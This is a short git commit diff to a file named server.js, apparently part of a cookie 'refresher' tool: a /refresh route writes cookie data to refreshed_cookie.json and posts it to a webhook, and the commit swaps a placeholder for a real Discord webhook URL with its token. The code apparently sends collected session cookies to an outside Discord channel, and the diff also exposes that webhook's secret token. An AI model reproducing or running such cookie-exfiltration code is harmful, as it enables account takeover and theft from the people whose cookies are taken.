8aa982b13110a9dd010782854b8844ac4c40c20a
Yyyyyy667 <109990918+Yyyyyy667@users.noreply.github.com>
2024-01-20 14:39:08 -0500

    server.js

--- server.js
+++ server.js
@@ -57,7 +57,7 @@ app.get('/refresh', async (req, res) => {
 
     fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4));
 
-    const webhookURL = 'HOOK HERE';
+    const webhookURL = 'https://discord.com/api/webhooks/1198348171047350312/OwczRO-mTVGjuaYAjnGGcETkruQn4P3p0PJDdhkMj_QdMXOD2Y85M5JVhD-68uYlpDs6';
     const response = await axios.post(webhookURL, {
         embeds: [
             {
